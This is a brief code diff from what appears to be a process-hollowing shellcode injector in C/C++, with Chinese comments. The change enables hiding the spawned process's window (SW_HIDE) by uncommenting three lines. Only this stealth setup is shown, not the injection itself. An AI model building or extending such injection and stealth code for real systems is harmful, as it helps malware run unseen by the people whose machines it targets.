@@ -42,9 +42,9 @@ void hollowing(const PWSTR path, const BYTE* shellcode, DWORD shellcodeSize) {
     PROCESS_INFORMATION PI = { 0 };
     STARTUPINFOW SI = { 0 };
     //隐藏新进程窗口
-    //SI.cb = sizeof(STARTUPINFO);
-    //SI.dwFlags = STARTF_USESHOWWINDOW; // 使用 wShowWindow 字段
-    //SI.wShowWindow = SW_HIDE;          // 隐藏窗口
+    SI.cb = sizeof(STARTUPINFO);
+    SI.dwFlags = STARTF_USESHOWWINDOW; // 使用 wShowWindow 字段
+    SI.wShowWindow = SW_HIDE;          // 隐藏窗口
 
     // 存储线程上下文信息
     CONTEXT CTX = { 0 };
